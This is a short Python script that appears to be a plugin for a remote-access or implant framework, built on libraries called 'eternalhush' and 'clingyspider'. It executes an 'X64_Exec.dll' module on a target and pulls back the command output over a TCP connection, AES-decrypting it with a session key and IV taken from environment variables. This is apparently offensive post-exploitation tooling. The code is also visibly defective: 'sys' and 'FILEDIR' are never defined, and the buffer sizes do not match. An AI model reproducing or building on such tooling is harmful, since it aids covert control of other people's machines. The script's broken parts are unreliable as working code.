import eternalhush as eh
from additional import clingyspider
import os

OUTPUT = {
    "output_length": eh.SHORT,
    "output": 4094,
}

def main(args):
    clingyspider.ExecuteModule(os.path.join(FILEDIR, "X64_Exec.dll"), args=args)
    connection = int(eh.ui.GetEnv("CLSP_CONNECTION"))
    session_key = bytearray.fromhex(eh.ui.GetEnv("CLSP_KEY"))
    next_iv = bytearray.fromhex(eh.ui.GetEnv("CLSP_IV"))
    
    encrypted_out = eh.net.TcpRecv(connection, 4096)
    
    output = eh.data.Struct(OUTPUT)
    output.from_bytes(eh.crypto.DecryptAesData(session_key, next_iv, encrypted_out))
    length = output.output_length.get(int)
    
    text_output = output.output.get(str, enc="cp866")[:length]
    eh.ui.Echo(text_output, eh.ECHO_DEFAULT)
    
if __name__ == "__main__":
    main(sys.argv)